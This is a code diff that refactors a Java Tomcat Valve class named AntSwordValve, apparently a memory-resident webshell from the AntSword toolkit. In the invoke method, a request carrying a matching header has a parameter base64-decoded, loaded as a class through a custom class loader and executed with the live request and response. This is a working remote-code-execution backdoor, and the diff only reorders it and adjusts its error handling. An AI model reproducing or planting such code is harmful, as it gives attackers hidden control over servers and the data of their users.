@@ -25,21 +25,35 @@ public class AntSwordValve extends ClassLoader implements Valve {
         super(z);
     }
 
+    @Override
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public void invoke(Request request, Response response) throws IOException, ServletException {
+        try {
+            if (request.getHeader(headerName) != null
+                    && request.getHeader(headerName).contains(headerValue)) {
+                byte[] bytes = base64Decode(request.getParameter(pass));
+                Object instance = (new AntSwordValve(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
+                instance.equals(new Object[]{request, response});
+                return;
+            }
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+        this.getNext().invoke(request, response);
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
-        Class base64;
+        Class<?> base64;
         try {
             base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
+            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception var5) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
@@ -66,21 +80,5 @@ public class AntSwordValve extends ClassLoader implements Valve {
 
     @Override
     public void backgroundProcess() {
-    }
-
-    @Override
-    @SuppressWarnings("all")
-    public void invoke(Request request, Response response) throws IOException, ServletException {
-        try {
-            if (request.getHeader(headerName) != null
-                    && request.getHeader(headerName).contains(headerValue)) {
-                byte[] bytes = base64Decode(request.getParameter(pass));
-                Object instance = (new AntSwordValve(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
-                instance.equals(new Object[]{request, response});
-                return;
-            }
-        } catch (Exception ignored) {
-        }
-        this.getNext().invoke(request, response);
     }
 }
